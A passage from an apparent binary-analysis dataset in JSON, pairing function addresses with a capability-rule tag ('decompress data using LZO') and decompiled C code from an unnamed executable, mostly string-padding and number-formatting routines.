                   }\n                    fcn.0048ca60(uVar9, uVar12 - uVar9, 0);\n                    iVar5 = *(iVar11 + 0x2c);\n                }\n            }\n            if (0 < iVar5) {\n                fcn.0048cc10(*(iVar11 + 0x11));\n                if (var_40h < 0) {\n                    fcn.0048bc80(-var_40h, *(iVar11 + 0x39));\n                    fcn.0048ba60(puVar13, iVar4);\n                }\n                else {\n                    fcn.0048ba60(puVar13 + var_40h, *(iVar11 + 0x2c));\n                }\n            }\n            uVar9 = var_44h + *(var_24h + -0xc);\n            uVar12 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar9 = uVar9 + *(iVar11 + 0x18);\n            }\n            var_20h = fcn.0048b140(0, 0, &var_26h);\n            fcn.0048c930(uVar9 * 2);\n            uVar3 = *(arg_10h + 8);\n            puVar14 = &var_1ch;\n            bVar10 = uVar12 == 0x10 && uVar9 < uVar3;\n            do {\n                if (*puVar14 < 5) {\n    // switch table (5 cases) at 0x5243b8\n                    switch(*puVar14) {\n                    case 0:\n                        if (bVar10) {\ncode_r0x004817ed:\n                            fcn.0048bc80(uVar3 - uVar9, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar10) goto code_r0x004817ed;\n                        fcn.0048cc10(arg_14h);\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            fcn.0048ba60(*(iVar11 + 0x14), *(iVar11 + 0x18));\n                        }\n                        break;\n                    case 3:\n                        if (var_44h != 0) {\n                            fcn.0048cc10(*var_50h);\n                        }\n                        break;\n                    case 4:\n                        fcn.0048bb20(&var_24h);\n                    }\n                }\n                puVar14 = puVar14 + 1;\n            } while (puVar14 != &var_18h);\n            if (var_44h < 2) {\n                uVar9 = *(var_20h + -0xc);\n            }\n            else {\n                fcn.0048ba60(var_50h + 1, var_44h - 1);\n                uVar9 = *(var_20h + -0xc);\n            }\n            if (uVar9 < uVar3) {\n                if (uVar12 == 0x20) {\n                    fcn.0048bc80(uVar3 - uVar9, arg_14h);\n                    uVar9 = uVar3;\n                }\n                else {\n                    fcn.0048b490(0, 0, uVar3 - uVar9, arg_14h);\n                    uVar9 = uVar3;\n                }\n            }\n            if (var_35h == 0) {\n                uVar12 = (**(*arg_8h + 0x30))(var_20h, uVar9);\n                var_35h = uVar12 != uVar9;\n            }\n            var_34h = arg_ch & 0xffffff00;\n            fcn.0048b630(&var_25h);\n            fcn.0048b630(&var_25h);\n        }\n    }\ncode_r0x00481596:\n    *(arg_10h + 8) = 0;\n    var_34h = var_34h & 0xffffff00 | var_35h;\n    return CONCAT44(var_34h, arg_8h);\n}\n",
        "token_count": 2471
    },
    "00481b20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00481b20(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint8_t **arg_18h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t *piVar7;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint8_t *puVar13;\n    uint *puVar14;\n    uint uVar15;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    char *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint8_t var_35h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_ch;\n    \n    var_34h = arg_ch;\n    var_35h = arg_ch;\n    iVar4 = fcn.004c0160(arg_10h + 0x6c);\n    iVar5 = fcn.00451af0();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar11 = *piVar7;\n    if (iVar11 == 0) {\n        puVar14 = fcn.004c2c70(0x44);\n        *puVar14 = 0x52c664;\n        *(puVar14 + 4) = 0;\n        puVar14[1] = 0;\n        puVar14[2] = 0;\n        puVar14[3] = 0;\n        *(puVar14 + 0x12) = 0;\n        puVar14[5] = 0;\n        puVar14[6] = 0;\n        puVar14[7] = 0;\n        puVar14[8] = 0;\n        puVar14[9] = 0;\n        puVar14[10] = 0;\n        puVar14[0xb] = 0;\n        puVar14[0xc] = 0;\n        puVar14[0xd] = 0;\n        *(puVar14 + 0x43) = 0;\n        fcn.004aa110(arg_10h + 0x6c);\n        fcn.004ad130(puVar14, iVar5);\n        iVar11 = *piVar7;\n    }\n    puVar13 = *arg_18h;\n    piVar7 = puVar13 + -0xc;\n    if (*puVar13 == *(iVar11 + 0x38)) {\n        var_1ch = *(iVar11 + 0x34);\n        if (*piVar7 == 0) goto code_r0x00481bd6;\n        var_50h = *(iVar11 + 0x24);\n        puVar13 = puVar13 + 1;\n        var_44h = *(iVar11 + 0x28);\n    }\n    else {\n        var_1ch = *(iVar11 + 0x30);\n        var_50h = *(iVar11 + 0x1c);\n        var_44h = *(iVar11 + 0x20);\n    }\n    puVar8 = puVar13 + *piVar7;\n    if ((puVar13 < puVar8) && (puVar6 = puVar13,  (*(*(iVar4 + 0x18) + *puVar13 * 2) & 8) != 0)) {\n        do {\n            puVar6 = puVar6 + 1;\n            if (puVar8 == puVar6) {\n                iVar4 = puVar8 - puVar13;\n                goto joined_r0x00481c06;\n            }\n        } while ((*(*(iVar4 + 0x18) + *puVar6 * 2) & 8) != 0);\n        iVar4 = puVar6 - puVar13;\njoined_r0x00481c06:\n        if (iVar4 != 0) {\n            var_24h = fcn.0048b140(0, 0, &var_20h);\n            fcn.0048c930(iVar4 * 2);\n            iVar5 = *(iVar11 + 0x2c);\n            var_40h = iVar4 - iVar5;\n            if (0 < var_40h) {\n                if (iVar5 < 0) {\n                    var_40h = iVar4;\n                }\n                if (*(iVar11 + 0xc) == 0) {\n                    fcn.0048bda0(puVar13, var_40h);\n                    iVar5 = *(iVar11 + 0x2c);\n                }\n                else {\n                    fcn.0048b490(0, *(var_24h + -0xc), var_40h * 2, 0);\n                    uVar15 = *(iVar11 + 0xc);\n                    uVar2 = *(iVar11 + 8);\n                    cVar1 = *(iVar11 + 0x12);\n                    if (-1 < *(var_24h + -4)) {\n                        fcn.0048b100();\n                    }\n                    iVar5 = fcn.004bd030(var_24h, cVar1, uVar2, uVar15, puVar13, puVar13 + var_40h);\n                    if (-1 < *(var_24h + -4)) {\n                        fcn.0048b100();\n                    }\n                    uVar9 = iVar5 - var_24h;\n                    uVar12 = *(var_24h + -0xc);\n                    if (uVar12 < uVar9) {\n                        uVar15 = 0x524358;\n                        piVar7 = fcn.004be900(0x52436c, 0x524358);\n                        fcn.0048b630(&var_25h, uVar15, uVar9, uVar12);\n                        fcn.0048b630(&var_25h);\n                        uVar15 = fcn.0043a8e0(piVar7);\n                        fcn.004c2e40(uVar15);\n                        (**(*piVar7 + 4))();\n                        do {\n                            uVar15 = fcn.004c32d0();\n                            fcn.004c2e40(uVar15);\n                        } while( true );\n                    }\n                    fcn.0048ca60(uVar9, uVar12 - uVar9, 0);\n                    iVar5 = *(iVar11 + 0x2c);\n                }\n            }\n            if (0 < iVar5) {\n                fcn.0048cc10(*(iVar11 + 0x11));\n                if (var_40h < 0) {\n                    fcn.0048bc80(-var_40h, *(iVar11 + 0x39));\n                    fcn.0048ba60(puVar13, iVar4);\n                }\n                else {\n                    fcn.0048ba60(puVar13 + var_40h, *(iVar11 + 0x2c));\n                }\n            }\n            uVar9 = var_44h + *(var_24h + -0xc);\n            uVar12 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar9 = uVar9 + *(iVar11 + 0x18);\n            }\n            var_20h = fcn.0048b140(0, 0, &var_26h);\n            fcn.0048c930(uVar9 * 2);\n            uVar3 = *(arg_10h + 8);\n            puVar14 = &var_1ch;\n            bVar10 = uVar12 == 0x10 && uVar9 < uVar3;\n            do {\n                if (*puVar14 < 5) {\n    // switch table (5 cases) at 0x5243a4\n                    switch(*puVar14) {\n                    case 0:\n                        if (bVar10) {\ncode_r0x00481e2d:\n                            fcn.0048bc80(uVar3 - uVar9, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar10) goto code_r0x00481e2d;\n                        fcn.0048cc10(arg_14h);\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            fcn.0048ba60(*(iVar11 + 0x14), *(iVar11 + 0x18));\n                        }\n                        break;\n                    case 3:\n                        if (var_44h != 0) {\n                            fcn.0048cc10(*var_50h);\n                        }\n                        break;\n                    case 4:\n                        fcn.0048bb20(&var_24h);\n                    }\n                }\n                puVar14 = puVar14 + 1;\n            } while (puVar14 != &var_18h);\n            if (var_44h < 2) {\n                uVar9 = *(var_20h + -0xc);\n            }\n            else {\n                fcn.0048ba60(var_50h + 1, var_44h - 1);\n                uVar9 = *(var_20h + -0xc);\n            }\n            if (uVar9 < uVar3) {\n                if (uVar12 == 0x20) {\n                    fcn.0048bc80(uVar3 - uVar9, arg_14h);\n                    uVar9 = uVar3;\n                }\n                else {\n                    fcn.0048b490(0, 0, uVar3 - uVar9, arg_14h);\n                    uVar9 = uVar3;\n                }\n            }\n            if (var_35h == 0) {\n                uVar12 = (**(*arg_8h + 0x30))(var_20h, uVar9);\n                var_35h = uVar12 != uVar9;\n            }\n            var_34h = arg_ch & 0xffffff00;\n            fcn.0048b630(&var_25h);\n            fcn.0048b630(&var_25h);\n        }\n    }\ncode_r0x00481bd6:\n    *(arg_10h + 8) = 0;\n    var_34h = var_34h & 0xffffff00 | var_35h;\n    return CONCAT44(var_34h, arg_8h);\n}\n",
        "token_count": 2475
    },
    "00482210": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.00482210(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    uint32_t *puVar8;\n    uint32_t *puVar9;\n    unkbyte10 in_stack_00000018;\n    uint uStack116;\n    uint *puStack112;\n    uint32_t auStack108 [2];\n    char *apcStack100 [2];\n    unkbyte10 aStack92 [2];\n    int32_t var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t *var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uchar var_21h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_bp_ch;\n    \n    var_3ch = arg_10h;\n    var_40h = arg_18h;\n    auStack108[0] = arg_14h + 0x6c;\n    puStack112 = 0x48223b;\n    fcn.004aebe0();\n    uStack116 = 0x482246;\n    puStack112 = &fcn.00482210::var_20h;\n    var_34h = fcn.004c01c0();\n    uStack116 = 0x482253;\n    iVar4 = fcn.00437ed0();\n    iVar4 = -iVar4;\n    piVar7 = &stack0xffffff90 + iVar4;\n    uVar6 = &fcn.00482210::var_40h + iVar4 + 3 & 0xfffffff0;\n    var_30h = uVar6;\n    *(&stack0xffffff8c + iVar4) = 0x482264;\n    var_1ch = fcn.004ae940();\n    *(&stack0xffffffa0 + iVar4) = 0;\n    *(&stack0xffffff9c + iVar4) = \"%.*Lf\";\n    *(&stack0xffffff98 + iVar4) = 0x40;\n    *(&stack0xffffffa4 + iVar4) = in_stack_00000018;\n    *(&stack0xffffff94 + iVar4) = uVar6;\n    *(&stack0xffffff90 + iVar4) = &fcn.00482210::var_1ch;\n    *(&stack0xffffff8c + iVar4) = 0x482295;\n    iVar5 = fcn.004bd670();\n    if (0x3f < iVar5) {\n        var_44h = iVar5 + 1;\n        *(&stack0xffffff8c + iVar4) = 0x4822b0;\n        iVar5 = fcn.00437ed0();\n        iVar5 = -iVar5;\n        piVar7 = &stack0xffffff90 + iVar5 + iVar4;\n        uVar6 = &fcn.00482210::var_40h + iVar5 + iVar4 + 3 & 0xfffffff0;\n        var_30h = uVar6;\n        *(&stack0xffffff8c + iVar5 + iVar4) = 0x4822c1;\n        var_1ch = fcn.004ae940();\n        iVar3 = var_44h;\n        *(&stack0xffffffa0 + iVar5 + iVar4) = 0;\n        *(&stack0xffffff9c + iVar5 + iVar4) = \"%.*Lf\";\n        *(&stack0xffffffa4 + iVar5 + iVar4) = in_stack_00000018;\n        *(&stack0xffffff98 + iVar5 + iVar4) = iVar3;\n        *(&stack0xffffff94 + iVar5 + iVar4) = uVar6;\n        *(&stack0xffffff90 + iVar5 + iVar4) = &fcn.00482210::var_1ch;\n        *(&stack0xffffff8c + iVar5 + iVar4) = 0x4822ee;\n        iVar5 = fcn.004bd670();\n    }\n    piVar7[1] = 0;\n    piVar7[2] = &stack0xffffffdb;\n    *piVar7 = iVar5;\n    piVar7[-1] = 0x482309;\n    fcn.004851f0();\n    if (-1 < *(var_1ch + -4)) {\n        piVar7[-4] = 0x4823d7;\n        fcn.004831f0();\n    }\n    iVar4 = *var_34h;\n    piVar7[-1] = var_1ch;\n    iVar5 = iVar5 + var_30h;\n    piVar7[-3] = var_30h;\n    piVar7[-2] = iVar5;\n    pcVar2 = *(iVar4 + 0x2c);\n    puVar8 = piVar7 + -4;\n    piVar7[-4] = 0x482332;\n    (*pcVar2)();\n    if (var_3ch == '\\0') {\n        *puVar8 = var_40h & 0xffff;\n        puVar8[1] = &fcn.00482210::var_1ch;\n        puVar8[-2] = arg_ch;\n        puVar8[-1] = arg_14h;\n        puVar8[-3] = arg_8h;\n        puVar8[-4] = 0x4823c4;\n        _var_30h = fcn.00482440(puVar8[-3], puVar8[-2], puVar8[-1], *puVar8, puVar8[1]);\n    }\n    else {\n        *puVar8 = var_40h & 0xffff;\n        puVar8[1] = &fcn.00482210::var_1ch;\n        puVar8[-2] = arg_ch;\n        puVar8[-1] = arg_14h;\n        puVar8[-3] = arg_8h;\n        puVar8[-4] = 0x482363;\n        _var_30h = fcn.00482a60(puVar8[-3], puVar8[-2], puVar8[-1], *puVar8, puVar8[1]);\n    }\n    if (*0x515a34 == 0) {\n        iVar4 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    puVar9 = puVar8 + -8;\n    if (iVar4 < 1) {\n        var_30h = _var_30h;\n        puVar8[-8] = &stack0xffffffdb;\n        var_2ch = _var_30h >> 0x20;\n        puVar8[-9] = 0x482402;\n        fcn.00483750();\n        puVar9 = puVar8 + -9;\n    }\n    var_30h = _var_30h;\n    var_2ch = _var_30h >> 0x20;\n    puVar9[-1] = 0x48238d;\n    fcn.004aed00();\n    return _var_30h;\n}\n",
        "token_count": 1725
    },
    "00482440": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00482440(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int16_t **arg_18h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    bool bVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int16_t *piVar11;\n    uint32_t uVar12;\n    uint *puVar13;\n    int32_t iVar14;\n    uint uVar15;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    ushort *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint8_t var_35h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_ch;\n    \n    var_34h = arg_ch;\n    var_35h = arg_ch;\n    piVar4 = fcn.004c01c0(arg_10h + 0x6c);\n    iVar5 = fcn.00451af0();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar10 = *piVar7;\n    if (iVar10 == 0) {\n        puVar13 = fcn.004c2c70(0x54);\n        puVar13[1] = 0;\n        *puVar13 = 0x52c674;\n        puVar13[2] = 0;\n        puVar13[3] = 0;\n        *(puVar13 + 4) = 0;\n        *(puVar13 + 0x12) = 0;\n        puVar13[6] = 0;\n        puVar13[7] = 0;\n        puVar13[8] = 0;\n        puVar13[9] = 0;\n        puVar13[10] = 0;\n        puVar13[0xb] = 0;\n        puVar13[0xc] = 0;\n        puVar13[0xd] = 0;\n        puVar13[0xe] = 0;\n        *(puVar13 + 0x52) = 0;\n        fcn.004aa7f0(arg_10h + 0x6c);\n        fcn.004ad130(puVar13, iVar5);\n        iVar10 = *piVar7;\n    }\n    piVar11 = *arg_18h;\n    if (*piVar11 == *(iVar10 + 0x3c)) {\n        var_1ch = *(iVar10 + 0x38);\n        var_4ch = *(iVar10 + 0x28);\n        var_40h = *(iVar10 + 0x2c);\n        if (*(piVar11 + -6) != 0) {\n            piVar11 = piVar11 + 1;\n        }\n    }\n    else {\n        var_1ch = *(iVar10 + 0x34);\n        var_40h = *(iVar10 + 0x24);\n        var_4ch = *(iVar10 + 0x20);\n    }\n    iVar5 = (**(*piVar4 + 0x14))(8, piVar11, piVar11 + *(piVar11 + -6));\n    iVar6 = iVar5 - piVar11 >> 1;\n    if (iVar6 != 0) {\n        var_24h = fcn.00483230(0, 0, &var_20h);\n        fcn.00484bb0(iVar5 - piVar11);\n        iVar5 = *(iVar10 + 0x30);\n        iVar14 = iVar6 - iVar5;\n        if (0 < iVar14) {\n            if (iVar5 < 0) {\n                iVar14 = iVar6;\n            }\n            if (*(iVar10 + 0xc) == 0) {\n                fcn.00483f40(piVar11, iVar14);\n                iVar5 = *(iVar10 + 0x30);\n            }\n            else {\n                fcn.004835b0(0, *(var_24h + -0xc), iVar14 * 2, 0);\n                uVar15 = *(iVar10 + 0xc);\n                uVar2 = *(iVar10 + 8);\n                uVar1 = *(iVar10 + 0x14);\n                if (-1 < *(var_24h + -4)) {\n                    fcn.004831f0();\n                }\n                iVar5 = fcn.004bd190(var_24h, uVar1, uVar2, uVar15, piVar11, piVar11 + iVar14);\n                if (-1 < *(var_24h + -4)) {\n                    fcn.004831f0();\n                }\n                uVar12 = *(var_24h + -0xc);\n                uVar9 = iVar5 - var_24h >> 1;\n                if (uVar12 < uVar9) {\n                    uVar15 = 0x52473c;\n                    piVar7 = fcn.004be900(0x524750, 0x52473c);\n                    fcn.00483770(&var_25h, uVar15, uVar9, uVar12);\n                    uVar15 = fcn.0043a8e0(piVar7);\n                    fcn.004c2e40(uVar15);\n                    (**(*piVar7 + 4))();\n                    do {\n                        uVar15 = fcn.004c32d0();\n                        fcn.004c2e40(uVar15);\n                    } while( true );\n                }\n                fcn.00484ce0(uVar9, uVar12 - uVar9, 0);\n                iVar5 = *(iVar10 + 0x30);\n            }\n        }\n        if (0 < iVar5) {\n            fcn.00484e80(*(iVar10 + 0x12));\n            if (iVar14 < 0) {\n                fcn.00483e20(-iVar14, *(iVar10 + 0x3e));\n                fcn.00483bd0(piVar11, iVar6);\n            }\n            else {\n                fcn.00483bd0(piVar11 + iVar14, *(iVar10 + 0x30));\n            }\n        }\n        uVar9 = var_40h + *(var_24h + -0xc);\n        uVar12 = *(arg_10h + 0xc) & 0xb0;\n        if ((*(arg_10h + 0xc) & 0x200) != 0) {\n            uVar9 = uVar9 + *(iVar10 + 0x1c);\n        }\n        var_20h = fcn.00483230(0, 0, &var_26h);\n        fcn.00484bb0(uVar9 * 2);\n        uVar3 = *(arg_10h + 8);\n        puVar13 = &var_1ch;\n        bVar8 = uVar12 == 0x10 && uVar9 < uVar3;\n        do {\n            if (*puVar13 < 5) {\n    // switch table (5 cases) at 0x52479c\n                switch(*puVar13) {\n                case 0:\n                    if (bVar8) {\ncode_r0x0048271d:\n                        fcn.00483e20(uVar3 - uVar9, arg_14h);\n                    }\n                    break;\n                case 1:\n                    if (bVar8) goto code_r0x0048271d;\n                    fcn.00484e80(arg_14h);\n                    break;\n                case 2:\n                    if ((*(arg_10h + 0xd) & 2) != 0) {\n                        fcn.00483bd0(*(iVar10 + 0x18), *(iVar10 + 0x1c));\n                    }\n                    break;\n                case 3:\n                    if (var_40h != 0) {\n                        fcn.00484e80(*var_4ch);\n                    }\n                    break;\n                case 4:\n                    fcn.00483cb0(&var_24h);\n                }\n            }\n            puVar13 = puVar13 + 1;\n        } while (puVar13 != &var_18h);\n        if (var_40h < 2) {\n            uVar9 = *(var_20h + -0xc);\n        }\n        else {\n            fcn.00483bd0(var_4ch + 1, var_40h - 1);\n            uVar9 = *(var_20h + -0xc);\n        }\n        if (uVar9 < uVar3) {\n            if (uVar12 == 0x20) {\n                fcn.00483e20(uVar3 - uVar9, arg_14h);\n                uVar9 = uVar3;\n            }\n            else {\n                fcn.004835b0(0, 0, uVar3 - uVar9, arg_14h);\n                uVar9 = uVar3;\n            }\n        }\n        if (var_35h == 0) {\n            uVar12 = (**(*arg_8h + 0x30))(var_20h, uVar9);\n            var_35h = uVar12 != uVar9;\n        }\n        var_34h = arg_ch & 0xffffff00;\n        fcn.00483770(&var_25h);\n        fcn.00483770(&var_25h);\n    }\n    *(arg_10h + 8) = 0;\n    var_34h = var_34h & 0xffffff00 | var_35h;\n    return CONCAT44(var_34h, arg_8h);\n}\n",
        "token_count": 2289
    },
    "00482a60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00482a60(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int16_t **arg_18h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    bool bVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int16_t *piVar11;\n    uint32_t uVar12;\n    uint *puVar13;\n    int32_t iVar14;\n    uint uVar15;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    ushort *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint8_t var_35h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_ch;\n    \n    var_34h = arg_ch;\n    var_35h = arg_ch;\n    piVar4 = fcn.004c01c0(arg_10h + 0x6c);\n    iVar5 = fcn.00451af0();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar10 = *piVar7;\n    if (iVar10 == 0) {\n        puVar13 = fcn.004c2c70(0x54);\n        puVar13[1] = 0;\n        *puVar13 = 0x52c684;\n        puVar13[2] = 0;\n        puVar13[3] = 0;\n        *(puVar13 + 4) = 0;\n        *(puVar13 + 0x12) = 0;\n        puVar13[6] = 0;\n        puVar13[7] = 0;\n        puVar13[8] = 0;\n        puVar13[9] = 0;\n        puVar13[10] = 0;\n        puVar13[0xb] = 0;\n        puVar13[0xc] = 0;\n        puVar13[0xd] = 0;\n        puVar13[0xe] = 0;\n        *(puVar13 + 0x52) = 0;\n        fcn.004ab010(arg_10h + 0x6c);\n        fcn.004ad130(puVar13, iVar5);\n        iVar10 = *piVar7;\n    }\n    piVar11 = *arg_18h;\n    if (*piVar11 == *(iVar10 + 0x3c)) {\n        var_1ch = *(iVar10 + 0x38);\n        var_4ch = *(iVar10 + 0x28);\n        var_40h = *(iVar10 + 0x2c);\n        if (*(piVar11 + -6) != 0) {\n            piVar11 = piVar11 + 1;\n        }\n    }\n    else {\n        var_1ch = *(iVar10 + 0x34);\n        var_40h = *(iVar10 + 0x24);\n        var_4ch = *(iVar10 + 0x20);\n    }\n    iVar5 = (**(*piVar4 + 0x14))(8, piVar11, piVar11 + *(piVar11 + -6));\n    iVar6 = iVar5 - piVar11 >> 1;\n    if (iVar6 != 0) {\n        var_24h = fcn.00483230(0, 0, &var_20h);\n        fcn.00484bb0(iVar5 - piVar11);\n        iVar5 = *(iVar10 + 0x30);\n        iVar14 = iVar6 - iVar5;\n        if (0 < iVar14) {\n            if (iVar5 < 0) {\n                iVar14 = iVar6;\n            }\n            if (*(iVar10 + 0xc) == 0) {\n                fcn.00483f40(piVar11, iVar14);\n                iVar5 = *(iVar10 + 0x30);\n            }\n            else {\n                fcn.004835b0(0, *(var_24h + -0xc), iVar14 * 2, 0);\n                uVar15 = *(iVar10 + 0xc);\n                uVar2 = *(iVar10 + 8);\n                uVar1 = *(iVar10 + 0x14);\n                if (-1 < *(var_24h + -4)) {\n                    fcn.004831f0();\n                }\n                iVar5 = fcn.004bd190(var_24h, uVar1, uVar2, uVar15, piVar11, piVar11 + iVar14);\n                if (-1 < *(var_24h + -4)) {\n                    fcn.004831f0();\n                }\n                uVar12 = *(var_24h + -0xc);\n                uVar9 = iVar5 - var_24h >> 1;\n                if (uVar12 < uVar9) {\n                    uVar15 = 0x52473c;\n                    piVar7 = fcn.004be900(0x524750, 0x52473c);\n                    fcn.00483770(&var_25h, uVar15, uVar9, uVar12);\n                    uVar15 = fcn.0043a8e0(piVar7);\n                    fcn.004c2e40(uVar15);\n                    (**(*piVar7 + 4))();\n                    do {\n                        uVar15 = fcn.004c32d0();\n                        fcn.004c2e40(uVar15);\n                    } while( true );\n                }\n                fcn.00484ce0(uVar9, uVar12 - uVar9, 0);\n                iVar5 = *(iVar10 + 0x30);\n            }\n        }\n        if (0 < iVar5) {\n            fcn.00484e80(*(iVar10 + 0x12));\n            if (iVar14 < 0) {\n                fcn.00483e20(-iVar14, *(iVar10 + 0x3e));\n                fcn.00483bd0(piVar11, iVar6);\n            }\n            else {\n                fcn.00483bd0(piVar11 + iVar14, *(iVar10 + 0x30));\n            }\n        }\n        uVar9 = var_40h + *(var_24h + -0xc);\n        uVar12 = *(arg_10h + 0xc) & 0xb0;\n        if ((*(arg_10h + 0xc) & 0x200) != 0) {\n            uVar9 = uVar9 + *(iVar10 + 0x1c);\n        }\n        var_20h = fcn.00483230(0, 0, &var_26h);\n        fcn.00484bb0(uVar9 * 2);\n        uVar3 = *(arg_10h + 8);\n        puVar13 = &var_1ch;\n        bVar8 = uVar12 == 0x10 && uVar9 < uVar3;\n        do {\n            if (*puVar13 < 5) {\n    // switch table (5 cases) at 0x524788\n                switch(*puVar13) {\n                case 0:\n                    if (bVar8) {\ncode_r0x00482d3d:\n                        fcn.00483e20(uVar3 - uVar9, arg_14h);\n                    }\n                    break;\n                case 1:\n                    if (bVar8) goto code_r0x00482d3d;\n                    fcn.00484e80(arg_14h);\n                    break;\n                case 2:\n                    if ((*(arg_10h + 0xd) & 2) != 0) {\n                        fcn.00483bd0(*(iVar10 + 0x18), *(iVar10 + 0x1c));\n                    }\n                    break;\n                case 3:\n                    if (var_40h != 0) {\n                        fcn.00484e80(*var_4ch);\n                    }\n                    break;\n                case 4:\n                    fcn.00483cb0(&var_24h);\n                }\n            }\n            puVar13 = puVar13 + 1;\n        } while (puVar13 != &var_18h);\n        if (var_40h < 2) {\n            uVar9 = *(var_20h + -0xc);\n        }\n        else {\n            fcn.00483bd0(var_4ch + 1, var_40h - 1);\n            uVar9 = *(var_20h + -0xc);\n        }\n        if (uVar9 < uVar3) {\n            if (uVar12 == 0x20) {\n                fcn.00483e20(uVar3 - uVar9, arg_14h);\n                uVar9 = uVar3;\n            }\n            else {\n                fcn.004835b0(0, 0, uVar3 - uVar9, arg_14h);\n                uVar9 = uVar3;\n            }\n        }\n        if (var_35h == 0) {\n            uVar12 = (**(*arg_8h + 0x30))(var_20h, uVar9);\n            var_35h = uVar12 != uVar9;\n        }\n        var_34h = arg_ch & 0xffffff00;\n        fcn.00483770(&var_25h);\n        fcn.00483770(&var_25h);\n    }\n    *(arg_10h + 8) = 0;\n    var_34h = var_34h & 0xffffff00 | var_35h;\n    return CONCAT44(var_34h, arg_8h);\n}\n",
        "token_count": 2289
    },
    "00483580": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00483580(void)\n\n{\n    fcn.00484bb0(0);\n    return;\n}\n",
        "token_count": 26
    },
    "00483bd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
